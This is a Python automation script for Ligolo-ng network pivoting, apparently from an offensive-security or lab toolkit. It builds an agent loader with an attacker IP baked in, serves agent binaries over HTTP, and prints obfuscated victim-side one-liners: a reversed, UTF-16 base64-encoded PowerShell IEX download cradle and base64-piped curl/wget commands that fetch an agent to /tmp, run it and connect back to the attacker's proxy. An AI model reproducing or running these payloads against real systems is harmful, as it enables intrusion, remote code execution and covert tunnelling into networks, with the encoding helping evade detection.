import argparse
import subprocess
import re
import os
import shutil
import base64
import psutil
import threading
import time
import base64

def get_tun0_ip():
    # Function to get the IP address of tun0
    result = subprocess.run(['ifconfig', 'tun0'], capture_output=True, text=True)
    match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
    return match.group(1) if match else None

def define_variables():
    # Define IPADDRESS
    ipaddress = get_tun0_ip() or '127.0.0.1'  # Default to loopback address if tun0 IP not found
    
    # Define PROXYPORT
    proxyport = 11601
    
    # Define OUTPUT_DIR
    output_dir = r'c:\windows\tasks'
    
    return ipaddress, proxyport, output_dir

def parse_arguments():
    parser = argparse.ArgumentParser(description='Script to define variables.')
    parser.add_argument('-ip', dest='ipaddress', type=str, help='Override IPADDRESS')
    parser.add_argument('-port', dest='proxyport', type=int, help='Override PROXYPORT')
    parser.add_argument('-path', dest='output_dir', type=str, help='Override OUTPUT_DIR')
    args = parser.parse_args()
    
    return args

def replace_placeholders(ipaddress, proxyport, output_dir):
    # Define paths
    input_file = os.path.expanduser('~/.local/bin/ligolo/input.txt')
    output_file = os.path.expanduser('~/.local/bin/ligolo/agent_loader/Program.cs')

    # Read input file
    with open(input_file, 'r') as f:
        content = f.read()

    # Replace placeholders
    content = content.replace('<IPADDRESS>', ipaddress)
    content = content.replace('<PROXYPORT>', str(proxyport))
    content = content.replace('<OUTPUT_DIR>', output_dir)

    # Write modified content to output file
    with open(output_file, 'w') as f:
        f.write(content)


def build_and_copy_application(project_directory, current_working_dir):
    os.chdir(project_directory)

    xbuild_command = "xbuild /p:Configuration=Release /p:Platform=x64 /property:OutputPath={0}/agent_loader/bin/x64/Release {0}/agent_loader.sln".format(os.path.expanduser('~/.local/bin/ligolo'))
    
    try:
        subprocess.run(xbuild_command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Ligolo.exe built successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to build the application. Error: {e}")

    # Copy the compiled application file to the current working directory
    source_exe_file = os.path.expanduser('~/.local/bin/ligolo/agent_loader/bin/x64/Release/agent_loader.exe')
    destination_exe_file = os.path.join(current_working_dir, "ligolo.exe")
    try:
        shutil.copyfile(source_exe_file, destination_exe_file)
    except IOError as e:
        print(f"Failed to copy the application file. Error: {e}")

    # Copy the agent.exe file to the current working directory
    source_agent_file = os.path.expanduser('~/.local/bin/websrv/agent.exe')
    destination_agent_file = os.path.join(current_working_dir, "agent.exe")
    try:
        shutil.copyfile(source_agent_file, destination_agent_file)
    except IOError as e:
        print(f"Failed to copy the agent file. Error: {e}")

    # Copy the Linux agent file to the current working directory
    source_linux_agent_file = os.path.expanduser('~/.local/bin/websrv/agent')
    destination_linux_agent_file = os.path.join(current_working_dir, "agent")
    try:
        shutil.copyfile(source_linux_agent_file, destination_linux_agent_file)
    except IOError as e:
        print(f"Failed to copy the Linux agent file. Error: {e}")


def update_ligolo_template(ipaddress, current_working_dir):
    # Define the path to the ligolo.txt template
    template_file = os.path.expanduser('~/.local/bin/ligolo/ligolo.txt')
    
    # Read the template file
    with open(template_file, 'r') as f:
        content = f.read()
    
    # Replace the <IPADDRESS> placeholder
    updated_content = content.replace('<IPADDRESS>', ipaddress)
    
    # Define the output file path
    output_file = os.path.join(current_working_dir, 'ligolo.txt')
    
    # Write the updated content to the output file
    with open(output_file, 'w') as f:
        f.write(updated_content)

def encode_linux_command_base64(command):
    # Encode Linux command with base64
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    return encoded_command

def encode_powershell_command_utf16(command):
    # Encode PowerShell command with UTF-16
    encoded_command = base64.b64encode(command.encode('utf-16le')).decode('utf-8')
    return f'powershell -enc {encoded_command}'

def manipulate_commands_and_display_text(ipaddress, proxyport):
    # Original PowerShell command
    original_command = "IEX (New-Object Net.WebClient).DownloadString('http://<IPADDRESS>/ligolo.txt')"

    # Update IPADDRESS placeholder
    updated_command = original_command.replace('<IPADDRESS>', ipaddress)

    # Print the updated command
    print(f"Base Command: \033[90m{updated_command}\033[0m")  # Gray color

    # Reverse the command and prepare it for execution in PowerShell
    reversed_command = ''.join(reversed(updated_command))
    reversed_command = reversed_command.replace("'", "''")  # Escape single quotes

    # Build PowerShell command to reverse and execute the reversed command
    reverse_and_execute_command = (
        f"$reversed = '{reversed_command}'.ToCharArray();[array]::Reverse($reversed);-join $reversed | IEX"
    )

    # Print the reversed and execute command
    print(f"Reversed Command: \033[93m{reverse_and_execute_command}\033[0m")  # Light Blue color

    # Print the DoubleHop command
    double_hop_command = f"DoubleHop: \033[94magent -connect $pivot:$port -ignore-cert\033[0m"
    print(double_hop_command)

    # Generate and print the Linux command with curl
    additional_command_curl = (
        f"curl -o /tmp/tmpbz {ipaddress}/agent; chmod +x /tmp/tmpbz; "
        "ip a | grep -v '127.0.0.1' | grep -v inet6 | grep inet | awk '{print $2}' | "
        "sed 's/\\(\\([0-9]\\{1,3\\}\\.\\)\\{3\\}\\)[0-9]\\{1,3\\}\\//\\10\\//' | "
        'while read -r i; do echo "\033[93m\nsudo ip route add $i dev ligolo\033[0m"; '
        f"done; echo '\033[38;5;158mDont forget to stop the webserver!!\033[0m'; "
        f"/tmp/tmpbz -connect {ipaddress}:{proxyport} -ignore-cert &"
    )

    # Generate and print the Linux command with wget
    additional_command_wget = (
        f"wget -O /tmp/tmpbz {ipaddress}/agent; chmod +x /tmp/tmpbz; "
        "ip a | grep -v '127.0.0.1' | grep -v inet6 | grep inet | awk '{print $2}' | "
        "sed 's/\\(\\([0-9]\\{1,3\\}\\.\\)\\{3\\}\\)[0-9]\\{1,3\\}\\//\\10\\//' | "
        'while read -r i; do echo "\033[93msudo ip route add $i dev ligolo\033[0m"; '
        f"done; echo '\033[38;5;158m\nDont forget to stop the webserver!!\033[0m'; "
        f"/tmp/tmpbz -connect {ipaddress}:{proxyport} -ignore-cert &"
    )

    # Print the commands
    #print(f"Linux Command (curl): \033[91m{additional_command_curl}\033[0m")  # Red color
    #print(f"Linux Command (wget): \033[91m{additional_command_wget}\033[0m")  # Red color

    # Encode the Linux commands in base64
    encoded_linux_command_curl = encode_linux_command_base64(additional_command_curl)
    encoded_linux_command_wget = encode_linux_command_base64(additional_command_wget)

    # Print the encoded Linux commands
    print(f"(curl): \033[38;5;138mecho {encoded_linux_command_curl} | base64 -d | bash\033[0m")  # Neon Green color
    print(f"(wget): \033[38;5;158mecho {encoded_linux_command_wget} | base64 -d | bash\033[0m")  # Neon Green color

    # Encode the reversed command in UTF-16 PowerShell encoding
    encoded_command = encode_powershell_command_utf16(reverse_and_execute_command)

    # Print the encoded PowerShell command
    print(f"(powershell): \033[92m{encoded_command}\033[0m")  # Neon Green color

    # Return the reversed command for potential further use
    return reversed_command


def run_tmux_commands(proxyport):
    session_name = "ligolo"
    
    # Check if the tmux session already exists
    result = subprocess.run(f"tmux has-session -t {session_name}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    if result.returncode != 0:
        # Session does not exist, create a new one
        subprocess.run(f"tmux new-session -d -s {session_name}", shell=True, check=True)
    
    # Define tmux commands to run
    tmux_commands = []
    
    # Construct tmux command if proxyport is provided
    if proxyport:
        tmux_commands.append(
            f"tmux send-keys -t {session_name} '{os.path.expanduser('~/.local/bin/websrv/proxy')} -selfcert -laddr 0.0.0.0:{proxyport}' Enter"
        )
    else:
        print("Proxy port not provided. Skipping tmux command.")
        return None
    return tmux_commands

    # Run tmux commands
    for cmd in tmux_commands:
        subprocess.run(cmd, shell=True, check=True)

    return session_name


def execute_routing_commands():
    # Define routing commands
    commands = [
        "sudo ip tuntap add user kali mode tun ligolo",
        "sudo ip link set ligolo up"
    ]
    
    # Execute each command using subprocess.run()
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, check=True, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            stderr = e.stderr.decode().strip()
            if "Device or resource busy" in stderr:
                # Device 'ligolo' already exists or is busy. Continue silently.
                continue
            else:
                print(f"Error executing command {cmd}: {stderr}")

def launch_web_server(current_working_dir, port=80):
    # Change to the current directory
    os.chdir(current_working_dir)

    # Try to start the server on port 80
    try:
        os.system(f"sudo python3 -m http.server {port}")
    except KeyboardInterrupt:
        print("Server stopped.")

def watch_netstat(proxyport, current_working_dir):
    def check_netstat():
        try:
            # Command to check established connections on the specified proxyport
            netstat_command = f"netstat -tulnap | grep {proxyport} | grep ESTABLISHED"
            result = subprocess.run(netstat_command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0 and "ESTABLISHED" in result.stdout:
                #print(f"Established connection on port {proxyport} found.")
                
                # Simulate sending commands to tmux session
                commands_to_send = [
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo session Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo start Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo ifconfig Enter"
                ]
                
                for cmd in commands_to_send:
                    subprocess.run(cmd, shell=True, check=True)
                
                # Example: Sending more commands or actions as needed
                # subprocess.run(f"tmux send-keys -t ligolo 'session' Enter", shell=True, check=True)
                # subprocess.run(f"tmux send-keys -t ligolo Enter", shell=True, check=True)
                
        except subprocess.CalledProcessError as e:
            print(f"Error checking netstat: {e}")
    
    # Start the monitoring in a separate thread
    netstat_thread = threading.Thread(target=check_netstat)
    netstat_thread.start()

def main():
    args = parse_arguments()
    ipaddress, proxyport, output_dir = define_variables()
    
    # Override default values if arguments are provided
    if args.ipaddress:
        ipaddress = args.ipaddress
    if args.proxyport:
        proxyport = args.proxyport
    if args.output_dir:
        output_dir = args.output_dir

    # Replace placeholders in input.txt and save to Program.cs
    replace_placeholders(ipaddress, proxyport, output_dir)

    # Build the application and copy the executable
    project_directory = os.path.expanduser('~/.local/bin/ligolo')
    current_working_dir = os.getcwd()
    build_and_copy_application(project_directory, current_working_dir)

    # Update ligolo.txt template and write to current working directory
    update_ligolo_template(ipaddress, current_working_dir)

    # Manipulate PowerShell and Linux commands with IPADDRESS and PROXYPORT
    manipulate_commands_and_display_text(ipaddress, proxyport)

    # Run tmux commands and return session name
    session_name = run_tmux_commands(proxyport)

    # Execute routing commands
    execute_routing_commands()

    # Launch web server in the current working directory
    launch_web_server(current_working_dir, port=80)

    # Watch netstat for established connections on proxyport and create proof file
    watch_netstat(proxyport, current_working_dir)
    
if __name__ == "__main__":
    main()
